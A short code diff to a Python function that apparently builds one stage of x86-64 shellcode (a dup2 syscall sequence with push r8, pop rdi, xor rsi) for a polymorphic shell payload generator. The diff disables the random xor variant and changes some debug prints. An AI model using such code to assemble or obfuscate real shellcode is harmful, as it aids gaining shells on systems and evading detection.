@@ -4,7 +4,7 @@ from func_instu import *
 
 def partie3():
 
-    x = random.randint(0, 1)
+    x = random.randint(0, 0)
 
     if x == 0:
         resultat = movxl('al', 33)
@@ -12,6 +12,8 @@ def partie3():
         rdmxor = randomxor('al')
         moval = movxl('al', 33)
         resultat = rdmxor + moval
+    
+    print(f"OP 3 = {resultat}")
 
     pushr8 = '\\x41\\x50' # push r8
     poprdi = '\\x5f' # pop rdi
@@ -20,7 +22,7 @@ def partie3():
 
     resultat_concat = resultat + pushr8 + poprdi + xorrsi + syscall
 
-    print("partie 3:", resultat_concat)
+    print("Partie 3 = ", resultat_concat)
     print("")
 
     """
